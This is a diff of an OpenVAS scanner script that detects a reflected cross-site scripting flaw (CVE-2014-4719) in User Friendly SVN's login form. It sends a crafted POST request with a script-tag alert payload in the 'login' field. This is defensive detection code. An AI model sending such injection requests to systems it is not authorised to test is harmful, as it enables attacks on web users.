@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_usvn_login_param_xss_vuln.nasl 7165 2017-09-18 08:57:44Z cfischer $
+# $Id: gb_usvn_login_param_xss_vuln.nasl 11213 2018-09-04 09:30:51Z mmartin $
 #
 # User Friendly SVN 'login' Cross Site Scripting Vulnerability
 #
@@ -27,31 +27,31 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.804725");
-  script_version("$Revision: 7165 $");
+  script_version("$Revision: 11213 $");
   script_cve_id("CVE-2014-4719");
   script_bugtraq_id(68155);
   script_tag(name:"cvss_base", value:"4.3");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2017-09-18 10:57:44 +0200 (Mon, 18 Sep 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-04 11:30:51 +0200 (Tue, 04 Sep 2018) $");
   script_tag(name:"creation_date", value:"2014-07-29 17:06:00 +0530 (Tue, 29 Jul 2014)");
   script_name("User Friendly SVN 'login' Cross Site Scripting Vulnerability");
 
-  script_tag(name : "summary" , value : "This host is installed with User Friendly SVN and is prone to cross site
+  script_tag(name:"summary", value:"This host is installed with User Friendly SVN and is prone to cross site
   scripting vulnerability.");
-  script_tag(name : "vuldetect" , value : "Send a crafted exploit string via HTTP GET request and check whether it is
+  script_tag(name:"vuldetect", value:"Send a crafted exploit string via HTTP GET request and check whether it is
   possible to read cookie or not.");
-  script_tag(name : "insight" , value : "Flaw is due to the /svn/login/ script does not validate input to the 'login'
+  script_tag(name:"insight", value:"Flaw is due to the /svn/login/ script does not validate input to the 'login'
   parameter before returning it to users.");
-  script_tag(name : "impact" , value : "Successful exploitation will allow attacker to execute arbitrary HTML and
+  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary HTML and
   script code in a user's browser session in the context of an affected site.
 
   Impact Level: Application");
-  script_tag(name : "affected" , value : "User-Friendly SVN version before 1.0.7");
-  script_tag(name : "solution" , value : "Upgrade to version 1.0.7 or later,
+  script_tag(name:"affected", value:"User-Friendly SVN version before 1.0.7");
+  script_tag(name:"solution", value:"Upgrade to version 1.0.7 or later,
   For updates refer to http://www.usvn.info");
 
-  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/127177");
-  script_xref(name : "URL" , value : "http://www.zerodaylab.com/vulnerabilities/CVE-2014/CVE-2014-4719.html");
+  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/127177");
+  script_xref(name:"URL", value:"http://www.zerodaylab.com/vulnerabilities/CVE-2014/CVE-2014-4719.html");
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
   script_family("Web application abuses");
@@ -69,22 +69,14 @@ if(description)
 include("http_func.inc");
 include("http_keepalive.inc");
 
-## Variable Initialization
-http_port = "";
-sndReq = "";
-rcvRes = "";
-
-## Get HTTP Port
 http_port = get_http_port(default:80);
 
-## Check Host Supports PHP
 if(!can_host_php(port:http_port)){
   exit(0);
 }
 
 host = http_host_name(port:http_port);
 
-## Iterate over possible paths
 foreach dir (make_list_unique("/", "/usvn", "/usvn/public", cgi_dirs(port:http_port)))
 {
 
@@ -93,26 +85,20 @@ foreach dir (make_list_unique("/", "/usvn", "/usvn/public", cgi_dirs(port:http_p
   sndReq = http_get(item:string(dir, "/login/index.php"),  port:http_port);
   rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);
 
-  ## confirm the Application
   if(">Welcome to USVN<" >< rcvRes)
   {
-    ## Construct attack request
     url = dir + '/login/index.php';
 
-    ## Construct post data
     postData = 'login=<script>alert("Cross Site Scripting Atack");</script>&password=&submit=Submit';
 
-    ## Construct the POST request
     sndReq = string("POST ", url, " HTTP/1.1\r\n",
                     "Host: ", host, "\r\n",
                     "Content-Type: application/x-www-form-urlencoded\r\n",
                     "Content-Length: ", strlen(postData), "\r\n",
                     "\r\n", postData);
 
-    ## Send request and receive the response
     rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq, bodyonly:FALSE);
 
-    ## Confirm exploit worked by checking the response
     ## Extra check is not possible
     if(rcvRes =~ "HTTP/1\.. 200" && '<script>alert("Cross Site Scripting Atack");</script>' >< rcvRes
     && '>USVN<' >< rcvRes)
